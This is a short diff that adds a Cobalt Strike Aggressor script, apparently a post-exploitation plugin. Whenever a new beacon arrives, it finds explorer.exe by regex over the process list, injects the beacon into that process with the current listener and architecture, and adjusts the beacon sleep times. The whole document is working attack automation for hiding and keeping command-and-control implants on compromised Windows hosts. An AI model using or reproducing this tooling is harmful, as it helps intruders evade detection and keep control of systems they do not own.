@@ -1,0 +1,32 @@
+# Auto migrate plugin by dk0n9
+
+on beacon_initial {
+    sub injectToProcess {
+        $parentBeaconID = $1;
+        # get explorer.exe pid
+        $regex = '(.*\n)+explorer.exe\t\d+\t(\d+)(.*\n)+';
+        if ($2 ismatch $regex) {
+            $pid = matched()[1];
+            $injectPID = $pid;
+        }
+        # get current listener
+        $listener = beacon_info($1, "listener");
+        # get arch
+        if (-is64 $1) {
+            $arch = "x64";
+        } else {
+            $arch = "x86";
+        }
+        # inject
+        binject($1, $pid, $listener, $arch); # beaconID, pid, listener, arch
+    }
+
+    # check migrated
+    if ($injectPID != beacon_info($1, "pid")) {
+        bps($1, &injectToProcess);
+    } else {
+        bsleep($1, 60, 30); # Set migrated beacon sleep time 
+        bsleep($parentBeaconID, 60, 30); # Set parent beacon sleep time
+        blog("\c5" . $1 . " already migrated.");
+    }
+}
